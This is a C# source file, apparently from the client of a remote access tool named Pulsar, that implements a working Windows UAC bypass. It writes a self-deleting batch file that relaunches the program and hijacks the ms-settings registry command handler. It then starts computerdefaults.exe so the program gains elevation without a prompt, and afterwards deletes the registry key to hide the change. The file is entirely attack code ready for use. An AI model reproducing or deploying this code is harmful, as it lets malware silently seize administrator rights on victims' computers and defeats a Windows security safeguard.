using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Client.Helper.UAC
{
    public class Bypass
    {
        private static string randomBatname = Guid.NewGuid().ToString("N").Substring(0, 8);

        public static void DoUacBypass()
        {
            string exePath = Application.ExecutablePath;

            string batPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), randomBatname + ".bat");

            string batContent = $@"
        @echo off
        timeout /t 4 /nobreak >nul
        start """" ""{exePath}""
        (goto) 2>nul & del ""%~f0""
        ";

            System.IO.File.WriteAllText(batPath, batContent, Encoding.ASCII);

            string command = $"conhost --headless \"{batPath}\"";

            using (RegistryKey classesKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes", true))
            {
                using (RegistryKey cmdKey = classesKey.CreateSubKey(@"ms-settings\Shell\Open\command"))
                {
                    cmdKey.SetValue("", command, RegistryValueKind.String);
                    cmdKey.SetValue("DelegateExecute", "", RegistryValueKind.String);
                }
            }

            Process p = new Process();
            p.StartInfo.FileName = "computerdefaults.exe";
            p.Start();
            p.WaitForExit();

            using (RegistryKey classesKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes", true))
            {
                try
                {
                    classesKey.DeleteSubKeyTree("ms-settings");
                }
                catch { }
            }
        }
    }
}
